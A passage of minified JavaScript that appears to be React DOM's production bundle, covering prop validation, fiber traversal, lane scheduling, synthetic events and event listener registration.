tb=q({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ya(e,i){if(i){if(tb[e]&&(i.children!=null||i.dangerouslySetInnerHTML!=null))throw Error(r(137,e));if(i.dangerouslySetInnerHTML!=null){if(i.children!=null)throw Error(r(60));if(typeof i.dangerouslySetInnerHTML!="object"||!("__html"in i.dangerouslySetInnerHTML))throw Error(r(61))}if(i.style!=null&&typeof i.style!="object")throw Error(r(62))}}function ba(e,i){if(e.indexOf("-")===-1)return typeof i.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var va=null;function wa(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var ka=null,vn=null,wn=null;function Xd(e){if(e=_r(e)){if(typeof ka!="function")throw Error(r(280));var i=e.stateNode;i&&(i=Us(i),ka(e.stateNode,e.type,i))}}function Zd(e){vn?wn?wn.push(e):wn=[e]:vn=e}function eu(){if(vn){var e=vn,i=wn;if(wn=vn=null,Xd(e),i)for(e=0;e<i.length;e++)Xd(i[e])}}function tu(e,i){return e(i)}function iu(){}var xa=!1;function nu(e,i,o){if(xa)return e(i,o);xa=!0;try{return tu(e,i,o)}finally{xa=!1,(vn!==null||wn!==null)&&(iu(),eu())}}function cr(e,i){var o=e.stateNode;if(o===null)return null;var l=Us(o);if(l===null)return null;o=l[i];e:switch(i){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(l=!l.disabled)||(e=e.type,l=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!l;break e;default:e=!1}if(e)return null;if(o&&typeof o!="function")throw Error(r(231,i,typeof o));return o}var Ta=!1;if(h)try{var dr={};Object.defineProperty(dr,"passive",{get:function(){Ta=!0}}),window.addEventListener("test",dr,dr),window.removeEventListener("test",dr,dr)}catch{Ta=!1}function ib(e,i,o,l,u,g,b,k,A){var j=Array.prototype.slice.call(arguments,3);try{i.apply(o,j)}catch(F){this.onError(F)}}var ur=!1,vs=null,ws=!1,Sa=null,nb={onError:function(e){ur=!0,vs=e}};function rb(e,i,o,l,u,g,b,k,A){ur=!1,vs=null,ib.apply(nb,arguments)}function sb(e,i,o,l,u,g,b,k,A){if(rb.apply(this,arguments),ur){if(ur){var j=vs;ur=!1,vs=null}else throw Error(r(198));ws||(ws=!0,Sa=j)}}function Ui(e){var i=e,o=e;if(e.alternate)for(;i.return;)i=i.return;else{e=i;do i=e,(i.flags&4098)!==0&&(o=i.return),e=i.return;while(e)}return i.tag===3?o:null}function ru(e){if(e.tag===13){var i=e.memoizedState;if(i===null&&(e=e.alternate,e!==null&&(i=e.memoizedState)),i!==null)return i.dehydrated}return null}function su(e){if(Ui(e)!==e)throw Error(r(188))}function ob(e){var i=e.alternate;if(!i){if(i=Ui(e),i===null)throw Error(r(188));return i!==e?null:e}for(var o=e,l=i;;){var u=o.return;if(u===null)break;var g=u.alternate;if(g===null){if(l=u.return,l!==null){o=l;continue}break}if(u.child===g.child){for(g=u.child;g;){if(g===o)return su(u),e;if(g===l)return su(u),i;g=g.sibling}throw Error(r(188))}if(o.return!==l.return)o=u,l=g;else{for(var b=!1,k=u.child;k;){if(k===o){b=!0,o=u,l=g;break}if(k===l){b=!0,l=u,o=g;break}k=k.sibling}if(!b){for(k=g.child;k;){if(k===o){b=!0,o=g,l=u;break}if(k===l){b=!0,l=g,o=u;break}k=k.sibling}if(!b)throw Error(r(189))}}if(o.alternate!==l)throw Error(r(190))}if(o.tag!==3)throw Error(r(188));return o.stateNode.current===o?e:i}function ou(e){return e=ob(e),e!==null?au(e):null}function au(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var i=au(e);if(i!==null)return i;e=e.sibling}return null}var lu=t.unstable_scheduleCallback,cu=t.unstable_cancelCallback,ab=t.unstable_shouldYield,lb=t.unstable_requestPaint,Fe=t.unstable_now,cb=t.unstable_getCurrentPriorityLevel,Aa=t.unstable_ImmediatePriority,du=t.unstable_UserBlockingPriority,ks=t.unstable_NormalPriority,db=t.unstable_LowPriority,uu=t.unstable_IdlePriority,xs=null,Gt=null;function ub(e){if(Gt&&typeof Gt.onCommitFiberRoot=="function")try{Gt.onCommitFiberRoot(xs,e,void 0,(e.current.flags&128)===128)}catch{}}var Lt=Math.clz32?Math.clz32:fb,hb=Math.log,pb=Math.LN2;function fb(e){return e>>>=0,e===0?32:31-(hb(e)/pb|0)|0}var Ts=64,Ss=4194304;function hr(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function As(e,i){var o=e.pendingLanes;if(o===0)return 0;var l=0,u=e.suspendedLanes,g=e.pingedLanes,b=o&268435455;if(b!==0){var k=b&~u;k!==0?l=hr(k):(g&=b,g!==0&&(l=hr(g)))}else b=o&~u,b!==0?l=hr(b):g!==0&&(l=hr(g));if(l===0)return 0;if(i!==0&&i!==l&&(i&u)===0&&(u=l&-l,g=i&-i,u>=g||u===16&&(g&4194240)!==0))return i;if((l&4)!==0&&(l|=o&16),i=e.entangledLanes,i!==0)for(e=e.entanglements,i&=l;0<i;)o=31-Lt(i),u=1<<o,l|=e[o],i&=~u;return l}function gb(e,i){switch(e){case 1:case 2:case 4:return i+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return i+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function mb(e,i){for(var o=e.suspendedLanes,l=e.pingedLanes,u=e.expirationTimes,g=e.pendingLanes;0<g;){var b=31-Lt(g),k=1<<b,A=u[b];A===-1?((k&o)===0||(k&l)!==0)&&(u[b]=gb(k,i)):A<=i&&(e.expiredLanes|=k),g&=~k}}function Ca(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function hu(){var e=Ts;return Ts<<=1,(Ts&4194240)===0&&(Ts=64),e}function Pa(e){for(var i=[],o=0;31>o;o++)i.push(e);return i}function pr(e,i,o){e.pendingLanes|=i,i!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,i=31-Lt(i),e[i]=o}function yb(e,i){var o=e.pendingLanes&~i;e.pendingLanes=i,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=i,e.mutableReadLanes&=i,e.entangledLanes&=i,i=e.entanglements;var l=e.eventTimes;for(e=e.expirationTimes;0<o;){var u=31-Lt(o),g=1<<u;i[u]=0,l[u]=-1,e[u]=-1,o&=~g}}function Ea(e,i){var o=e.entangledLanes|=i;for(e=e.entanglements;o;){var l=31-Lt(o),u=1<<l;u&i|e[l]&i&&(e[l]|=i),o&=~u}}var Se=0;function pu(e){return e&=-e,1<e?4<e?(e&268435455)!==0?16:536870912:4:1}var fu,Ia,gu,mu,yu,_a=!1,Cs=[],hi=null,pi=null,fi=null,fr=new Map,gr=new Map,gi=[],bb="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function bu(e,i){switch(e){case"focusin":case"focusout":hi=null;break;case"dragenter":case"dragleave":pi=null;break;case"mouseover":case"mouseout":fi=null;break;case"pointerover":case"pointerout":fr.delete(i.pointerId);break;case"gotpointercapture":case"lostpointercapture":gr.delete(i.pointerId)}}function mr(e,i,o,l,u,g){return e===null||e.nativeEvent!==g?(e={blockedOn:i,domEventName:o,eventSystemFlags:l,nativeEvent:g,targetContainers:[u]},i!==null&&(i=_r(i),i!==null&&Ia(i)),e):(e.eventSystemFlags|=l,i=e.targetContainers,u!==null&&i.indexOf(u)===-1&&i.push(u),e)}function vb(e,i,o,l,u){switch(i){case"focusin":return hi=mr(hi,e,i,o,l,u),!0;case"dragenter":return pi=mr(pi,e,i,o,l,u),!0;case"mouseover":return fi=mr(fi,e,i,o,l,u),!0;case"pointerover":var g=u.pointerId;return fr.set(g,mr(fr.get(g)||null,e,i,o,l,u)),!0;case"gotpointercapture":return g=u.pointerId,gr.set(g,mr(gr.get(g)||null,e,i,o,l,u)),!0}return!1}function vu(e){var i=Vi(e.target);if(i!==null){var o=Ui(i);if(o!==null){if(i=o.tag,i===13){if(i=ru(o),i!==null){e.blockedOn=i,yu(e.priority,function(){gu(o)});return}}else if(i===3&&o.stateNode.current.memoizedState.isDehydrated){e.blockedOn=o.tag===3?o.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Ps(e){if(e.blockedOn!==null)return!1;for(var i=e.targetContainers;0<i.length;){var o=Da(e.domEventName,e.eventSystemFlags,i[0],e.nativeEvent);if(o===null){o=e.nativeEvent;var l=new o.constructor(o.type,o);va=l,o.target.dispatchEvent(l),va=null}else return i=_r(o),i!==null&&Ia(i),e.blockedOn=o,!1;i.shift()}return!0}function wu(e,i,o){Ps(e)&&o.delete(i)}function wb(){_a=!1,hi!==null&&Ps(hi)&&(hi=null),pi!==null&&Ps(pi)&&(pi=null),fi!==null&&Ps(fi)&&(fi=null),fr.forEach(wu),gr.forEach(wu)}function yr(e,i){e.blockedOn===i&&(e.blockedOn=null,_a||(_a=!0,t.unstable_scheduleCallback(t.unstable_NormalPriority,wb)))}function br(e){function i(u){return yr(u,e)}if(0<Cs.length){yr(Cs[0],e);for(var o=1;o<Cs.length;o++){var l=Cs[o];l.blockedOn===e&&(l.blockedOn=null)}}for(hi!==null&&yr(hi,e),pi!==null&&yr(pi,e),fi!==null&&yr(fi,e),fr.forEach(i),gr.forEach(i),o=0;o<gi.length;o++)l=gi[o],l.blockedOn===e&&(l.blockedOn=null);for(;0<gi.length&&(o=gi[0],o.blockedOn===null);)vu(o),o.blockedOn===null&&gi.shift()}var kn=L.ReactCurrentBatchConfig,Es=!0;function kb(e,i,o,l){var u=Se,g=kn.transition;kn.transition=null;try{Se=1,Ra(e,i,o,l)}finally{Se=u,kn.transition=g}}function xb(e,i,o,l){var u=Se,g=kn.transition;kn.transition=null;try{Se=4,Ra(e,i,o,l)}finally{Se=u,kn.transition=g}}function Ra(e,i,o,l){if(Es){var u=Da(e,i,o,l);if(u===null)Ja(e,i,l,Is,o),bu(e,l);else if(vb(u,e,i,o,l))l.stopPropagation();else if(bu(e,l),i&4&&-1<bb.indexOf(e)){for(;u!==null;){var g=_r(u);if(g!==null&&fu(g),g=Da(e,i,o,l),g===null&&Ja(e,i,l,Is,o),g===u)break;u=g}u!==null&&l.stopPropagation()}else Ja(e,i,l,null,o)}}var Is=null;function Da(e,i,o,l){if(Is=null,e=wa(l),e=Vi(e),e!==null)if(i=Ui(e),i===null)e=null;else if(o=i.tag,o===13){if(e=ru(i),e!==null)return e;e=null}else if(o===3){if(i.stateNode.current.memoizedState.isDehydrated)return i.tag===3?i.stateNode.containerInfo:null;e=null}else i!==e&&(e=null);return Is=e,null}function ku(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(cb()){case Aa:return 1;case du:return 4;case ks:case db:return 16;case uu:return 536870912;default:return 16}default:return 16}}var mi=null,Ma=null,_s=null;function xu(){if(_s)return _s;var e,i=Ma,o=i.length,l,u="value"in mi?mi.value:mi.textContent,g=u.length;for(e=0;e<o&&i[e]===u[e];e++);var b=o-e;for(l=1;l<=b&&i[o-l]===u[g-l];l++);return _s=u.slice(e,1<l?1-l:void 0)}function Rs(e){var i=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&i===13&&(e=13)):e=i,e===10&&(e=13),32<=e||e===13?e:0}function Ds(){return!0}function Tu(){return!1}function bt(e){function i(o,l,u,g,b){this._reactName=o,this._targetInst=u,this.type=l,this.nativeEvent=g,this.target=b,this.currentTarget=null;for(var k in e)e.hasOwnProperty(k)&&(o=e[k],this[k]=o?o(g):g[k]);return this.isDefaultPrevented=(g.defaultPrevented!=null?g.defaultPrevented:g.returnValue===!1)?Ds:Tu,this.isPropagationStopped=Tu,this}return q(i.prototype,{preventDefault:function(){this.defaultPrevented=!0;var o=this.nativeEvent;o&&(o.preventDefault?o.preventDefault():typeof o.returnValue!="unknown"&&(o.returnValue=!1),this.isDefaultPrevented=Ds)},stopPropagation:function(){var o=this.nativeEvent;o&&(o.stopPropagation?o.stopPropagation():typeof o.cancelBubble!="unknown"&&(o.cancelBubble=!0),this.isPropagationStopped=Ds)},persist:function(){},isPersistent:Ds}),i}var xn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ja=bt(xn),vr=q({},xn,{view:0,detail:0}),Tb=bt(vr),La,Oa,wr,Ms=q({},vr,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Na,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==wr&&(wr&&e.type==="mousemove"?(La=e.screenX-wr.screenX,Oa=e.screenY-wr.screenY):Oa=La=0,wr=e),La)},movementY:function(e){return"movementY"in e?e.movementY:Oa}}),Su=bt(Ms),Sb=q({},Ms,{dataTransfer:0}),Ab=bt(Sb),Cb=q({},vr,{relatedTarget:0}),Ba=bt(Cb),Pb=q({},xn,{animationName:0,elapsedTime:0,pseudoElement:0}),Eb=bt(Pb),Ib=q({},xn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),_b=bt(Ib),Rb=q({},xn,{data:0}),Au=bt(Rb),Db={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Mb={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},jb={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Lb(e){var i=this.nativeEvent;return i.getModifierState?i.getModifierState(e):(e=jb[e])?!!i[e]:!1}function Na(){return Lb}var Ob=q({},vr,{key:function(e){if(e.key){var i=Db[e.key]||e.key;if(i!=="Unidentified")return i}return e.type==="keypress"?(e=Rs(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Mb[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Na,charCode:function(e){return e.type==="keypress"?Rs(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Rs(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Bb=bt(Ob),Nb=q({},Ms,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Cu=bt(Nb),Fb=q({},vr,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Na}),zb=bt(Fb),Ub=q({},xn,{propertyName:0,elapsedTime:0,pseudoElement:0}),Vb=bt(Ub),Wb=q({},Ms,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Hb=bt(Wb),$b=[9,13,27,32],Fa=h&&"CompositionEvent"in window,kr=null;h&&"documentMode"in document&&(kr=document.documentMode);var Gb=h&&"TextEvent"in window&&!kr,Pu=h&&(!Fa||kr&&8<kr&&11>=kr),Eu=" ",Iu=!1;function _u(e,i){switch(e){case"keyup":return $b.indexOf(i.keyCode)!==-1;case"keydown":return i.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ru(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var Tn=!1;function qb(e,i){switch(e){case"compositionend":return Ru(i);case"keypress":return i.which!==32?null:(Iu=!0,Eu);case"textInput":return e=i.data,e===Eu&&Iu?null:e;default:return null}}function Kb(e,i){if(Tn)return e==="compositionend"||!Fa&&_u(e,i)?(e=xu(),_s=Ma=mi=null,Tn=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(i.ctrlKey||i.altKey||i.metaKey)||i.ctrlKey&&i.altKey){if(i.char&&1<i.char.length)return i.char;if(i.which)return String.fromCharCode(i.which)}return null;case"compositionend":return Pu&&i.locale!=="ko"?null:i.data;default:return null}}var Jb={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Du(e){var i=e&&e.nodeName&&e.nodeName.toLowerCase();return i==="input"?!!Jb[e.type]:i==="textarea"}function Mu(e,i,o,l){Zd(l),i=Ns(i,"onChange"),0<i.length&&(o=new ja("onChange","change",null,o,l),e.push({event:o,listeners:i}))}var xr=null,Tr=null;function Qb(e){Yu(e,0)}function js(e){var i=En(e);if(ua(i))return e}function Yb(e,i){if(e==="change")return i}var ju=!1;if(h){var za;if(h){var Ua="oninput"in document;if(!Ua){var Lu=document.createElement("div");Lu.setAttribute("oninput","return;"),Ua=typeof Lu.oninput=="function"}za=Ua}else za=!1;ju=za&&(!document.documentMode||9<document.documentMode)}function Ou(){xr&&(xr.detachEvent("onpropertychange",Bu),Tr=xr=null)}function Bu(e){if(e.propertyName==="value"&&js(Tr)){var i=[];Mu(i,Tr,e,wa(e)),nu(Qb,i)}}function Xb(e,i,o){e==="focusin"?(Ou(),xr=i,Tr=o,xr.attachEvent("onpropertychange",Bu)):e==="focusout"&&Ou()}function Zb(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return js(Tr)}function ev(e,i){if(e==="click")return js(i)}function tv(e,i){if(e==="input"||e==="change")return js(i)}function iv(e,i){return e===i&&(e!==0||1/e===1/i)||e!==e&&i!==i}var Ot=typeof Object.is=="function"?Object.is:iv;function Sr(e,i){if(Ot(e,i))return!0;if(typeof e!="object"||e===null||typeof i!="object"||i===null)return!1;var o=Object.keys(e),l=Object.keys(i);if(o.length!==l.length)return!1;for(l=0;l<o.length;l++){var u=o[l];if(!p.call(i,u)||!Ot(e[u],i[u]))return!1}return!0}function Nu(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Fu(e,i){var o=Nu(e);e=0;for(var l;o;){if(o.nodeType===3){if(l=e+o.textContent.length,e<=i&&l>=i)return{node:o,offset:i-e};e=l}e:{for(;o;){if(o.nextSibling){o=o.nextSibling;break e}o=o.parentNode}o=void 0}o=Nu(o)}}function zu(e,i){return e&&i?e===i?!0:e&&e.nodeType===3?!1:i&&i.nodeType===3?zu(e,i.parentNode):"contains"in e?e.contains(i):e.compareDocumentPosition?!!(e.compareDocumentPosition(i)&16):!1:!1}function Uu(){for(var e=window,i=ys();i instanceof e.HTMLIFrameElement;){try{var o=typeof i.contentWindow.location.href=="string"}catch{o=!1}if(o)e=i.contentWindow;else break;i=ys(e.document)}return i}function Va(e){var i=e&&e.nodeName&&e.nodeName.toLowerCase();return i&&(i==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||i==="textarea"||e.contentEditable==="true")}function nv(e){var i=Uu(),o=e.focusedElem,l=e.selectionRange;if(i!==o&&o&&o.ownerDocument&&zu(o.ownerDocument.documentElement,o)){if(l!==null&&Va(o)){if(i=l.start,e=l.end,e===void 0&&(e=i),"selectionStart"in o)o.selectionStart=i,o.selectionEnd=Math.min(e,o.value.length);else if(e=(i=o.ownerDocument||document)&&i.defaultView||window,e.getSelection){e=e.getSelection();var u=o.textContent.length,g=Math.min(l.start,u);l=l.end===void 0?g:Math.min(l.end,u),!e.extend&&g>l&&(u=l,l=g,g=u),u=Fu(o,g);var b=Fu(o,l);u&&b&&(e.rangeCount!==1||e.anchorNode!==u.node||e.anchorOffset!==u.offset||e.focusNode!==b.node||e.focusOffset!==b.offset)&&(i=i.createRange(),i.setStart(u.node,u.offset),e.removeAllRanges(),g>l?(e.addRange(i),e.extend(b.node,b.offset)):(i.setEnd(b.node,b.offset),e.addRange(i)))}}for(i=[],e=o;e=e.parentNode;)e.nodeType===1&&i.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof o.focus=="function"&&o.focus(),o=0;o<i.length;o++)e=i[o],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var rv=h&&"documentMode"in document&&11>=document.documentMode,Sn=null,Wa=null,Ar=null,Ha=!1;function Vu(e,i,o){var l=o.window===o?o.document:o.nodeType===9?o:o.ownerDocument;Ha||Sn==null||Sn!==ys(l)||(l=Sn,"selectionStart"in l&&Va(l)?l={start:l.selectionStart,end:l.selectionEnd}:(l=(l.ownerDocument&&l.ownerDocument.defaultView||window).getSelection(),l={anchorNode:l.anchorNode,anchorOffset:l.anchorOffset,focusNode:l.focusNode,focusOffset:l.focusOffset}),Ar&&Sr(Ar,l)||(Ar=l,l=Ns(Wa,"onSelect"),0<l.length&&(i=new ja("onSelect","select",null,i,o),e.push({event:i,listeners:l}),i.target=Sn)))}function Ls(e,i){var o={};return o[e.toLowerCase()]=i.toLowerCase(),o["Webkit"+e]="webkit"+i,o["Moz"+e]="moz"+i,o}var An={animationend:Ls("Animation","AnimationEnd"),animationiteration:Ls("Animation","AnimationIteration"),animationstart:Ls("Animation","AnimationStart"),transitionend:Ls("Transition","TransitionEnd")},$a={},Wu={};h&&(Wu=document.createElement("div").style,"AnimationEvent"in window||(delete An.animationend.animation,delete An.animationiteration.animation,delete An.animationstart.animation),"TransitionEvent"in window||delete An.transitionend.transition);function Os(e){if($a[e])return $a[e];if(!An[e])return e;var i=An[e],o;for(o in i)if(i.hasOwnProperty(o)&&o in Wu)return $a[e]=i[o];return e}var Hu=Os("animationend"),$u=Os("animationiteration"),Gu=Os("animationstart"),qu=Os("transitionend"),Ku=new Map,Ju="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function yi(e,i){Ku.set(e,i),c(i,[e])}for(var Ga=0;Ga<Ju.length;Ga++){var qa=Ju[Ga],sv=qa.toLowerCase(),ov=qa[0].toUpperCase()+qa.slice(1);yi(sv,"on"+ov)}yi(Hu,"onAnimationEnd"),yi($u,"onAnimationIteration"),yi(Gu,"onAnimationStart"),yi("dblclick","onDoubleClick"),yi("focusin","onFocus"),yi("focusout","onBlur"),yi(qu,"onTransitionEnd"),d("onMouseEnter",["mouseout","mouseover"]),d("onMouseLeave",["mouseout","mouseover"]),d("onPointerEnter",["pointerout","pointerover"]),d("onPointerLeave",["pointerout","pointerover"]),c("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),c("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),c("onBeforeInput",["compositionend","keypress","textInput","paste"]),c("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Cr="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),av=new Set("cancel close invalid load scroll toggle".split(" ").concat(Cr));function Qu(e,i,o){var l=e.type||"unknown-event";e.currentTarget=o,sb(l,i,void 0,e),e.currentTarget=null}function Yu(e,i){i=(i&4)!==0;for(var o=0;o<e.length;o++){var l=e[o],u=l.event;l=l.listeners;e:{var g=void 0;if(i)for(var b=l.length-1;0<=b;b--){var k=l[b],A=k.instance,j=k.currentTarget;if(k=k.listener,A!==g&&u.isPropagationStopped())break e;Qu(u,k,j),g=A}else for(b=0;b<l.length;b++){if(k=l[b],A=k.instance,j=k.currentTarget,k=k.listener,A!==g&&u.isPropagationStopped())break e;Qu(u,k,j),g=A}}}if(ws)throw e=Sa,ws=!1,Sa=null,e}function Re(e,i){var o=i[tl];o===void 0&&(o=i[tl]=new Set);var l=e+"__bubble";o.has(l)||(Xu(i,e,2,!1),o.add(l))}function Ka(e,i,o){var l=0;i&&(l|=4),Xu(o,e,l,i)}var Bs="_reactListening"+Math.random().toString(36).slice(2);function Pr(e){if(!e[Bs]){e[Bs]=!0,s.forEach(function(o){o!=="selectionchange"&&(av.has(o)||Ka(o,!1,e),Ka(o,!0,e))});var i=e.nodeType===9?e:e.ownerDocument;i===null||i[Bs]||(i[Bs]=!0,Ka("selectionchange",!1,i))}}function Xu(e,i,o,l){switch(ku(i)){case 1:var u=kb;break;case 4:u=xb;break;default:u=Ra}o=u.bind(null,i,o,e),u=void 0,!Ta||i!=="touchstart"&&i!=="touchmove"&&i!=="wheel"||(u=!0),l?u!==void 0?e.addEventListener(i,o,{capture:!0,passive:u}):e.addEventListener(i,o,!0):u!==void 0?e.addEventListener(i,o,{passive:u}):e.addEventListener(i,o,!1)}function Ja(e,i,o,l,u){var g=l;if((i&1)===0&&(i&2)===0&&l!==null)e:for(;;){if(l===null)return;var b=l.tag;if(b===3||b===4){var k=l.stateNode.containerInfo;if(k===u||k.nodeType===8&&k.parentNode===u)break;if(b===4)for(b=l.return;b!==null;){var A=b.tag;if((A===3||A===4)&&(A=b.stateNode.containerInfo,A===u||A.nodeType===8&&A.parentNode===u))return;b=b.return}for(;k!==null;){if(b=Vi(k),b===null)return;if(A=b.tag,A===5||A===6){l=g=b;continue e}k=k.parentNode}}l=l.return}nu(function(){var j=g,F=wa(o),z=[];e:{var N=Ku.get(e);if(N!==void 0){var K=ja,Z=e;switch(e){case"keypress":if(Rs(o)===0)break e;case"keydown":case"keyup":K=Bb;break;case"focusin":Z="focus",K=Ba;break;case"focusout":Z="blur",K=Ba;break;case"beforeblur":case"afterblur":K=Ba;break;case"click":if(o.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":K=Su;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":K=Ab;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":K=zb;break;case Hu:case $u:case Gu:K=Eb;break;case qu:K=Vb;break;case"scroll":K=Tb;break;case"wheel":K=Hb;break;case"copy":case"cut":case"paste":K=_b;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":K=Cu}var ee=(i&4)!==0,ze=!ee&&e==="scroll",_=ee?N!==null?N+"Capture":null:N;ee=[];for(var I=j,D;I!==null;){D=I;var U=D.stateNode;if(D.tag===5&&U!==null&&(D=U,_!==null&&(U=cr(I,_),U!=null&&ee.push(Er(I,U,D)))),ze)break;I=I.return}0<ee.length&&(N=new K(N,Z,null,o,F),z.push({event:N,listeners:ee}))}}if((i&7)===0){e:{if(N=e==="mouseover"||e==="pointerover",K=e==="mouseout"||e==="pointerout",N&&o!==va&&(Z=o.relatedTarget||o.fromElement)&&(Vi(Z)||Z[Zt]))break 